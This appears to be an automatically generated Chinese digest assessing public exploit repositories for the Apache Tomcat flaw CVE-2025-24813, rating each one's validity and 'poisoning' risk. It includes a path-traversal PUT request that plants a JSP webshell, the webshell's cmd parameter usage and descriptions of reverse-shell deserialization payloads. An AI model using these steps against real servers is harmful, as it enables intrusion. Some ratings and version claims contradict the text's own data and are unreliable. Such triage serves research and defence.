**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 安全敏感上传URL是公共上传URL的子目录，攻击者需要知道安全敏感文件的名称, 并且安全敏感文件通过部分PUT上传。 或者 默认Servlet启用写入 (默认禁用), 支持部分PUT (默认启用), 应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用此漏洞绕过访问控制，上传恶意文件，甚至执行远程代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，该漏洞利用**有效**。搜索引擎结果显示该漏洞已被公开披露，并且存在活跃利用。PoC代码提供了一种利用方式，即通过PUT请求上传JSP webshell，如果成功，攻击者可以通过访问上传的JSP文件来执行任意命令。

**投毒风险：**
提供的PoC代码比较简单，主要功能是上传一个JSP webshell。经过分析，没有发现作者有意隐藏的投毒代码。JSP webshell 本身存在风险，但这是漏洞利用本身固有的风险，而不是作者额外添加的恶意代码。因此，该仓库的投毒风险评估为**0%**。

**利用方式：**
1.  **先决条件：** 目标Tomcat服务器需要满足以下条件：
    *   `writes`参数在Tomcat的DefaultServlet中启用 (默认禁用)
    *   启用`支持partial PUT` (默认启用)
    *   目标上传路径为可写。
    *   对于RCE，需要应用使用Tomcat基于文件的session持久化，默认存储位置，应用程序包含一个可以在反序列化攻击中被利用的库。
2.  **上传JSP Webshell：** 使用PoC脚本，通过构造包含路径遍历的PUT请求，将JSP webshell上传到服务器的webapp目录中。请求类似如下：
    ```
    PUT /uploads/../webapps/ROOT/updates.jsp HTTP/1.1
    Content-Type: application/x-jsp
    ```
    其中`updates.jsp`为webshell的文件名。
3.  **执行命令：** 成功上传后，攻击者可以通过访问上传的JSP webshell，在服务器上执行任意命令。例如，如果上传的路径是`/updates.jsp`，则访问`http://<target>/updates.jsp?cmd=<command>`即可执行命令。

**总结：**
CVE-2025-24813是一个高危漏洞，利用条件相对苛刻, 如果目标Tomcat服务器配置不当，攻击者可以利用该漏洞进行RCE或信息泄露，务必及时升级到安全版本。

**项目地址:** [La3B0z/CVE-2025-24813-POC](https://github.com/La3B0z/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #15

**来源**: [CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md](../2025/CVE-2025-24813-Makavellik_POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露或恶意内容注入

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要满足以下条件:
1. 默认Servlet开启了写入功能（默认关闭）
2. 支持部分PUT请求（默认开启）
3. (RCE) 应用使用Tomcat的文件session持久化，且为默认存储位置，应用包含可用于反序列化攻击的库。
4. (信息泄露/内容注入) 存在安全敏感文件上传的目标URL，该URL是公开上传目标URL的子目录，攻击者知道被上传的安全敏感文件的名称，且安全敏感文件也是通过部分PUT上传的。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 漏洞是 Apache Tomcat 中由于路径等效性问题，以及部分 PUT 功能的缺陷导致的远程代码执行或信息泄露漏洞。攻击者可以通过构造恶意的部分 PUT 请求，上传恶意文件覆盖或注入到服务器上的敏感文件，或者在特定条件下利用反序列化漏洞执行任意代码。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞存在活跃的利用案例，并且有公开的 PoC 代码。提供的 PoC 代码描述看起来也比较完整，包括了利用步骤、所需依赖、payload生成方式，以及WAF绕过等功能。因此，可以认为该 PoC 代码具有较高的有效性。

**投毒风险分析：** PoC 代码中存在一定的投毒风险。风险点包括:

1.  **`ysoserial.jar` 依赖：** 该工具本身是用于生成 Java 反序列化 payload 的，如果下载的 `ysoserial.jar` 被篡改，则可能执行恶意代码。
2.  **自定义 Java Payload：** PoC 允许使用自定义的 Java 代码来生成 payload，如果攻击者不小心使用了包含恶意代码的 Java 源文件，也可能导致被攻击。
3.  **代码本身:** 仓库中作者可能在`POC-Exploit_CVE_2025_24813.py`隐藏了后门，导致使用者在不知情的情况下执行了恶意代码。

基于上述分析，投毒风险评估为 10%。

**利用方式总结：**

1.  **漏洞利用入口：** 通过构造恶意的 HTTP PUT 请求，利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 特性。
2.  **路径等效性：** 攻击者利用路径等效性问题（例如，`file.Name` 中的内部点），访问或操作受保护的文件。
3.  **信息泄露/内容注入：** 如果攻击者能够满足上述条件，则可以覆盖或注入恶意代码到服务器的敏感文件中。
4.  **远程代码执行：** 如果目标应用使用了 Tomcat 的文件 session 持久化，并且存在可利用的反序列化库，攻击者可以通过上传恶意 session 文件，触发反序列化漏洞，从而执行任意代码。
5.  **绕过WAF：** PoC 代码中包含 WAF 绕过功能，通过修改 Headers 或者对 Payload 进行拆分等方式，尝试绕过 WAF 的检测。

**项目地址:** [Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution](https://github.com/Makavellik/POC-CVE-2025-24813-Apache-Tomcat-Remote-Code-Execution)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #16

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-PoC-Apache-Tomcat-RCE.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 to 11.0.2, 10.1.0-M1 to 10.1.34, 9.0.0.M1 to 9.0.98

**利用条件:** writes enabled for the default servlet, support for partial PUT enabled, application using Tomcat's file-based session persistence with the default storage location, application includes a library that may be leveraged in a deserialization attack 或 writes enabled for the default servlet, support for partial PUT, target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者通过利用 'file.Name' (Internal Dot) 机制，结合启用了写入功能的 Default Servlet 和部分 PUT 请求支持，可以执行远程代码或进行信息泄露，甚至向上传的文件添加恶意内容。

**有效性评估：** 根据搜索结果，CVE-2025-24813 漏洞已被公开，并且有证据表明已被积极利用。虽然提供的 PoC 代码本身只包含一个 README.md 文件，无法直接证明漏洞的利用，但根据搜索结果，完整的利用链是存在的，并且漏洞本身是可被利用的。这个README.md只是一个占位符，提示存在利用代码。需要进一步搜索才能找到真正可用的POC。

**投毒风险评估：** 提供的 PoC 代码（README.md）非常简单，只包含标题，没有可执行的代码，因此**几乎**不存在直接的投毒风险。风险占比为1%。

**利用方式分析：**

利用 CVE-2025-24813 漏洞有两种主要方式：

1.  **远程代码执行 (RCE)：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。 （默认禁用）
        *   启用了部分 PUT 请求支持。 （默认启用）
        *   应用程序使用 Tomcat 的基于文件的会话持久化，并且使用默认存储位置。
        *   应用程序包含可用于反序列化攻击的库。
    *   攻击过程：攻击者利用部分 PUT 请求上传恶意文件到 Tomcat 的会话存储目录，然后通过反序列化漏洞执行任意代码。

2.  **信息泄露和恶意内容添加：**
    *   前提条件：
        *   Default Servlet 开启了写入权限。（默认禁用）
        *   启用了部分 PUT 请求支持。（默认启用）
        *   存在安全敏感上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
        *   攻击者知道安全敏感文件的名称。
        *   安全敏感文件也通过部分 PUT 上传。
    *   攻击过程：攻击者利用路径等价漏洞，通过部分 PUT 请求上传恶意文件，覆盖或修改目标 URL 下的安全敏感文件，从而导致信息泄露或向上传的文件添加恶意内容。

总而言之，该漏洞允许未经身份验证的攻击者在满足特定条件的情况下执行远程代码或进行信息泄露，需要尽快修复。


**项目地址:** [Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE](https://github.com/Mattb709/CVE-2025-24813-PoC-Apache-Tomcat-RCE)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #17

**来源**: [CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md](../2025/CVE-2025-24813-Mattb709_CVE-2025-24813-Scanner.md)

## CVE-2025-24813-Apache Tomcat-路径等价漏洞/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价漏洞/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需满足以下条件之一：

1.  信息泄露/内容注入：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, security sensitive files also being uploaded via partial PUT。
2.  远程代码执行：writes enabled for the default servlet, support for partial PUT, application was using Tomcat's file based session persistence with the default storage location, application included a library that may be leveraged in a deserialization attack。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是一个存在于Apache Tomcat中的路径等价漏洞，攻击者利用'file.Name'中的内部点，结合启用了写入的Default Servlet，可能导致远程代码执行、信息泄露或向上传文件中添加恶意内容。

**漏洞利用方式：**

此漏洞主要通过利用Tomcat的partial PUT特性和文件路径处理不当来实现。

1. **信息泄露/内容注入：** 攻击者首先需要Default Servlet开启了写入功能，并支持partial PUT。他们可以利用此漏洞上传恶意文件，或者修改已存在的文件内容，进行恶意内容注入，或者泄露安全敏感文件内容，需要利用精心构造的路径来实现攻击。例如，将恶意文件上传到公共目录的子目录下，利用Internal Dot来覆盖其他文件。

2. **远程代码执行：** 如果Tomcat启用了文件存储session，并且应用包含可被反序列化攻击的库，攻击者可以通过上传恶意的序列化文件，并覆盖Tomcat session文件，最终实现RCE。

**POC有效性分析：**

根据提供的POC代码，该脚本尝试通过PUT请求上传一个session文件，然后通过GET请求访问包含session ID的JSP页面。如果GET请求返回500错误，则认为目标存在漏洞，原因是上传的恶意session文件导致了反序列化异常。此方法可能可以验证漏洞的存在性，但需要目标环境满足特定的配置要求（例如，启用文件session存储并存在易受攻击的反序列化库）。搜索引擎结果也表明此漏洞在野外被积极利用。

**投毒风险分析：**

POC代码本身主要是漏洞验证，并无明显的恶意投毒行为。代码中使用了requests库进行HTTP请求，并根据响应状态码判断漏洞是否存在。 但是仍然存在一些风险：

*   **依赖风险：** 代码依赖于requests、pandas和colorama库，这些库可能存在安全漏洞，如果使用了被篡改的库，则可能引入安全风险。
*   **代码执行风险：** 虽然代码本身没有直接的恶意行为，但如果攻击者修改了代码，例如添加了反向shell等恶意逻辑，则可能实现远程代码执行。
*   **误报风险：** 如果目标服务器存在WAF或其他安全防护措施，可能会导致扫描结果出现误报。

综合考虑，此POC代码的投毒风险较低，大概为5%。主要风险在于对第三方库的依赖以及代码被篡改的可能性。

**项目地址:** [Mattb709/CVE-2025-24813-Scanner](https://github.com/Mattb709/CVE-2025-24813-Scanner)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #18

**来源**: [CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md](../2025/CVE-2025-24813-MuhammadWaseem29_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/路径穿越

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet开启写入功能（默认关闭），支持partial PUT（默认开启），以及目标URL为公共上传URL的子目录，攻击者需要知道敏感文件名，并且敏感文件也通过partial PUT上传。 或者需要应用使用Tomcat的基于文件的session持久化，并且包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-24813 是一个 Apache Tomcat 中的路径等价漏洞，允许攻击者通过构造包含 `../` 序列的恶意请求，绕过路径验证，从而实现远程代码执行或信息泄露。

**有效性：**
根据漏洞库信息、搜索结果以及提供的PoC代码，可以判断该PoC代码有效。搜索结果中多个来源表明该漏洞已被实际利用，并且存在公开的PoC。PoC代码展示了如何利用 PUT 方法上传包含恶意代码的 JSP 文件到 Tomcat 的 webapps 目录，从而实现远程代码执行。

**投毒风险：**
提供的PoC代码的主要功能是上传一个包含命令执行功能的 JSP 文件。该JSP文件允许攻击者通过 GET 参数 `cmd` 执行任意系统命令。PoC本身的功能是直接的，并没有发现隐藏的、非预期的恶意行为，例如：
*   篡改系统文件
*   植入持久性后门
*   窃取敏感信息并外传
*   利用其他漏洞
因此，根据现有信息，可以认为投毒风险较低。虽然使用了Runtime.getRuntime().exec来执行命令，但是这个是PoC的需要，目的是验证RCE。判断为0%.

**利用方式：**
1.  **利用条件确认：** 目标Tomcat服务器需要满足以下条件：
    *   默认Servlet开启写入功能（`readonly` 参数设置为 `false`）。
    *   支持 partial PUT 请求（默认开启）。
    *  攻击目标满足特定的文件存储结构和命名规则(参考漏洞描述)
    *   或者应用使用了Tomcat的基于文件的session持久化机制且包含可用于反序列化攻击的库
2.  **恶意JSP上传：** 攻击者使用 PUT 方法，将包含恶意代码的 JSP 文件上传到 Tomcat 服务器。PoC 中使用了路径穿越技巧（`../`），将文件上传到 webapps/ROOT 目录下，从而绕过访问限制。
3.  **命令执行：** 攻击者通过访问上传的 JSP 文件，并传递 `cmd` 参数，执行任意系统命令。PoC 中演示了如何使用 `cat /etc/passwd` 命令读取系统密码文件。

**搜索引擎结果总结：**
搜索结果表明该漏洞已存在实际攻击案例，并且 CISA 已将其添加到已知被利用漏洞目录中。多个安全厂商和博客都对该漏洞进行了分析和披露，并提供了检测和缓解建议。

**项目地址:** [MuhammadWaseem29/CVE-2025-24813](https://github.com/MuhammadWaseem29/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #19

**来源**: [CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md](../2025/CVE-2025-24813-N0c1or_CVE-2025-24813_POC.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence / Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 对于路径等价漏洞：默认Servlet启用写入权限，支持partial PUT，存在目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且敏感文件通过partial PUT上传。对于反序列化漏洞：默认Servlet启用写入权限，支持partial PUT，应用程序使用Tomcat基于文件的session持久化默认存储位置，应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 100%

## 详情

根据漏洞库信息和搜索结果，CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，它涉及到路径等价和反序列化两个方面。路径等价漏洞允许攻击者通过特殊的路径构造（例如使用内部点 `.Name`）来访问或修改受保护的文件。如果同时启用了 Default Servlet 的写入权限和 Partial PUT 支持，攻击者可以上传恶意文件，导致信息泄露或远程代码执行。反序列化漏洞则允许攻击者通过上传包含恶意序列化数据的 session 文件，结合 Tomcat 的文件 session 持久化机制以及应用程序中存在的易受攻击的反序列化库，最终实现远程代码执行。

漏洞利用方式：

1.  **路径等价攻击：** 攻击者利用 `file.Name` 这样的路径构造绕过访问控制，结合 Default Servlet 的写入权限和 Partial PUT 支持，上传恶意 JSP 文件或覆盖现有的配置文件。
2.  **反序列化攻击：** 攻击者首先确定目标应用程序使用了 Tomcat 的默认文件 session 持久化位置，然后构造恶意的序列化 payload，该 payload 利用应用程序依赖中的反序列化漏洞执行任意代码。 攻击者通过 Partial PUT 上传包含此 payload 的 session 文件到 Tomcat 的 session 存储目录，当 Tomcat 反序列化该 session 时，payload 被触发，导致远程代码执行。

提供的 POC 代码 `CVE-2025-24813_POC.py` 旨在利用反序列化漏洞。代码中包含了一个 Java 序列化 payload (payload_01)，它被编码为十六进制字符串。 该 payload 似乎是为了利用 `TemplatesImpl` 类中的漏洞来执行任意代码。 脚本首先尝试连接到目标 Tomcat 服务器，然后使用 Partial PUT 请求上传包含恶意 payload 的文件。  payload 包含占位符 {payload}，说明此exp并非完整，需要二次编辑才可使用。

有效性分析： 根据提供的代码片段，结合漏洞描述， 该POC 代码利用反序列化漏洞，因此，在满足反序列化漏洞的条件时，POC有效。

投毒风险分析：POC 代码中使用了硬编码的 payload 和目标 URL。攻击者可以很容易地修改这些参数以执行恶意操作，例如上传后门或窃取敏感数据，而不仅仅是执行简单的命令。  因此，该 POC 具有高投毒风险。并且其中存在占位符，说明需要进行二次编辑,那么投毒风险就是百分之百。


**项目地址:** [N0c1or/CVE-2025-24813_POC](https://github.com/N0c1or/CVE-2025-24813_POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #20

**来源**: [CVE-2025-24813-Olabanji10_Apache-GOExploiter.md](../2025/CVE-2025-24813-Olabanji10_Apache-GOExploiter.md)

## CVE-2025-24813

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行或信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要开启Default Servlet的写入功能，允许Partial PUT，并且满足特定的目录结构或使用Tomcat的文件Session持久化机制。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞。如果满足以下条件，攻击者可以进行远程代码执行或泄露敏感信息:

1.  **信息泄露/恶意内容注入:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   存在安全敏感文件上传的目标 URL，该 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   安全敏感文件通过 Partial PUT 上传。

2.  **远程代码执行:**
    *   Default Servlet 的写入功能已启用（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的 Session 持久化，使用默认存储位置。
    *   应用程序包含一个可以在反序列化攻击中利用的库。

**漏洞利用方式：**

*   **信息泄露/恶意内容注入：** 攻击者可以利用路径等价漏洞，通过构造恶意请求，覆盖或读取特定的安全敏感文件。
*   **远程代码执行：** 攻击者利用 Partial PUT 功能上传恶意构造的序列化 session 文件，并结合目标应用中存在的可被利用的反序列化漏洞，最终实现远程代码执行。

**POC分析：**

提供的 Go 代码通过 PUT 方法上传 JSP webshell 到多个预定义的目录中。它首先检测目标是否是Tomcat服务器，然后尝试在不同的目录下上传 `update_log.jsp` 文件，其中包含一个简单的命令执行界面。如果上传成功，它会将 URL 写入到 `Shelled.txt` 文件中。

**投毒风险分析：**

该POC代码的主要目的是利用漏洞上传webshell，本身没有明显的投毒行为。虽然webshell本身是一种恶意代码，但是这是漏洞利用的一部分，不应被视为投毒。 风险评估为5%。

**搜索引擎结果：**

多个搜索结果表明 CVE-2025-24813 漏洞已经被积极利用，远程代码执行是主要的攻击目标。

**项目地址:** [Olabanji10/Apache-GOExploiter](https://github.com/Olabanji10/Apache-GOExploiter)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #21

**来源**: [CVE-2025-24813-Shivshantp_CVE-2025-24813.md](../2025/CVE-2025-24813-Shivshantp_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat PUT JSP RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 需要目标Tomcat实例启用默认servlet的写入功能 (disabled by default) 和 支持 partial PUT (enabled by default)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中一个路径等价漏洞，允许未经身份验证的攻击者通过 PUT 请求上传恶意 JSP 文件来执行远程代码。漏洞利用依赖于两个关键配置：1. Tomcat 默认 Servlet 的写入功能必须启用（默认情况下禁用）。 2. 必须支持 partial PUT（默认启用）。

**有效性：**
根据提供的漏洞利用代码（`exploit/1. exploit_cve_2025_24813.py`），该 PoC 尝试通过 PUT 请求将一个包含命令执行功能的 JSP webshell 上传到目标 Tomcat 服务器，默认路径为 `/shell.jsp`。 成功上传后，该 PoC 尝试通过发送带有 `cmd` 参数的 GET 请求来执行系统命令，验证是否成功执行远程代码。

**投毒风险：**
该仓库主要包含漏洞利用脚本，webshell 以及 Dockerfile 等配置，作者在docker配置中创建了`/usr/local/tomcat/conf/Catalina/localhost/ROOT.xml`,并设置了`<Context privileged='true' antiResourceLocking='false' swallowOutput='true' />`, 如果docker hub上存在投毒行为,可能会导致用户的敏感信息泄露。经过分析，未发现明显的恶意代码或后门。`exploit/2.shell.jsp` 只是webshell 的另一个副本，与PoC脚本一致。总体来说，代码的投毒风险较低，约为5%。

**利用方式：**
1.  **前提条件检查：** 确保目标 Tomcat 服务器满足漏洞利用的条件（默认 Servlet 写入已启用，支持 partial PUT）。
2.  **上传恶意 JSP 文件：** 使用 PUT 请求将包含恶意代码的 JSP 文件（如 `shell.jsp`）上传到目标服务器。`exploit/1. exploit_cve_2025_24813.py` 脚本即实现了此步骤。
3.  **执行远程代码：** 成功上传 JSP 文件后，通过访问该文件并传递命令参数（如 `shell.jsp?cmd=whoami`）来执行任意系统命令。

**缓解措施：**
*   升级到受影响的 Apache Tomcat 版本的修复版本 (11.0.3, 10.1.35, or 9.0.98).
*   禁用默认 servlet 的写入功能。
*   限制对 Tomcat 服务器的访问权限。

**项目地址:** [Shivshantp/CVE-2025-24813](https://github.com/Shivshantp/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #22

**来源**: [CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md](../2025/CVE-2025-24813-absholi7ly_POC-CVE-2025-24813.md)

## CVE-2025-24813 Apache Tomcat Path Equivalence and Deserialization RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE), 信息泄露, 文件覆盖

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意文件上传

**影响版本:** 11.0.0-M1 through 11.0.2, 10.1.0-M1 through 10.1.34, 9.0.0.M1 through 9.0.98

**利用条件:** 以下条件全部满足时，可导致信息泄露和/或文件覆盖：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），安全敏感上传的目标URL是公共上传目标URL的子目录，攻击者知道安全敏感文件的名称，且安全敏感文件也通过部分PUT上传。以下条件全部满足时，可导致远程代码执行：默认Servlet的写入已启用（默认禁用），支持部分PUT（默认启用），应用程序使用Tomcat基于文件的会话持久化和默认存储位置，应用程序包含可能在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 95%

## 详情

CVE-2025-24813 存在于 Apache Tomcat 的路径等价处理中，攻击者可以通过利用 'file.Name' (内部点) 绕过安全检查。此漏洞可能导致远程代码执行、信息泄露，或通过启用了写入功能的默认Servlet将恶意内容添加到已上传的文件中。根据漏洞库信息和搜索结果，利用条件较为苛刻，需要特定的配置，如启用默认Servlet写入、支持部分PUT等。漏洞利用代码 `CVE_2025_24813.py` 尝试通过 PUT 请求上传恶意 payload 到会话文件存储目录，如果成功，可以触发反序列化漏洞，实现远程代码执行。代码包含检查 Servlet 是否可写的函数 `check_writable_servlet`，以及生成 ysoserial payload 的函数 `generate_ysoserial_payload`或者Java Payload的函数 `generate_java_payload`。该利用方式依赖于 Tomcat 的文件型 session 持久化机制，以及服务器上存在可被利用的反序列化 gadget。 鉴于代码可能包含恶意 payload 生成和上传功能，存在高风险的投毒可能性。

**项目地址:** [absholi7ly/POC-CVE-2025-24813](https://github.com/absholi7ly/POC-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #23

**来源**: [CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md](../2025/CVE-2025-24813-beyond-devsecops_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要默认Servlet的写入启用(readonly=false, allowPut=true, allowPartialPut=true)，应用使用Tomcat的文件Session持久化存储，应用包含可用于反序列化攻击的library

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个远程代码执行漏洞，该漏洞允许攻击者在满足特定条件的情况下执行任意代码。

**漏洞利用有效性分析：**

根据搜索引擎结果，该漏洞在发布后不久就出现了在野利用，多个安全厂商也发布了相关的分析报告和检测规则，表明该漏洞具有较高的实际威胁性。POC代码中，通过修改`web.xml`文件，开启了默认Servlet的写入权限和PUT方法，然后利用ysoserial生成反序列化payload，通过分块PUT请求上传payload，最后访问特定URL触发反序列化，从而执行反弹shell命令。如果目标环境符合漏洞描述中的所有条件（Default Servlet 开启写入、支持 partial PUT、使用文件session存储、存在可利用的反序列化库），那么该POC代码可以有效实现RCE。

**投毒风险分析：**

POC代码主要由shell脚本和Dockerfile组成。脚本负责构建、运行Tomcat镜像、生成payload、上传payload、触发漏洞等操作。Dockerfile用于构建包含漏洞环境的Tomcat镜像。仔细检查这些文件，发现潜在的投毒点可能在于:

*   **ysoserial payload生成：** 脚本使用`ysoserial.jar`生成payload，如果攻击者替换了`ysoserial.jar`文件，可能会植入恶意代码。但是脚本中包含了直接从`https://jitpack.io/com/github/frohoff/ysoserial/master-b7d0f27b46-1/ysoserial-master-b7d0f27b46-1.jar`下载`ysoserial.jar` 的代码，除非该链接被篡改，否则可以排除。虽然存在该风险，但因为是从已知源下载，所以该风险相对较低。
*   **Dockerfile修改：** Dockerfile通过sed命令修改`web.xml`文件，开启了`readonly=false`。如果`sed`命令被篡改，可能导致其他恶意配置。

总体来说，该POC代码的投毒风险较低，因为所有操作都相对透明，且依赖已知的工具和配置。最主要的风险在于ysoserial的下载源被篡改的可能性。因此，投毒风险评估为5%。

**漏洞利用方式：**

1.  **环境准备：** 构建包含漏洞版本的Apache Tomcat环境。Dockerfile中配置了允许PUT请求，这是一个关键的先决条件。
2.  **Payload生成：** 使用ysoserial工具，结合CommonsBeanutils1链，生成包含反弹shell命令的序列化payload。
3.  **Payload上传：** 通过分块PUT请求，将payload上传到服务器。
4.  **触发反序列化：** 访问特定的URL，触发反序列化漏洞，执行payload中的命令，从而获得反弹shell。

**项目地址:** [beyond-devsecops/CVE-2025-24813](https://github.com/beyond-devsecops/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #24

**来源**: [CVE-2025-24813-brs6412_CVE-2025-24813.md](../2025/CVE-2025-24813-brs6412_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-Path Equivalence/Deserialization

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** Default Servlet 启用写入 (默认禁用), 启用 partial PUT (默认启用), 目标 URL 是公共上传 URL 的子目录（对于信息泄露），或者应用使用 Tomcat 的基于文件的会话持久化且使用默认存储位置，以及应用程序包含可能被利用于反序列化攻击的库（对于 RCE）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

根据CVE信息和搜索结果，CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，与DefaultServlet处理文件上传的逻辑相关。如果启用了 DefaultServlet 的写入功能，并且启用了 partial PUT 支持，攻击者可以通过构造包含 `file.Name` (内部点) 的路径来覆盖敏感文件或执行恶意代码。漏洞可能导致远程代码执行、信息泄露，或向已上传文件中添加恶意内容。

**有效性：**

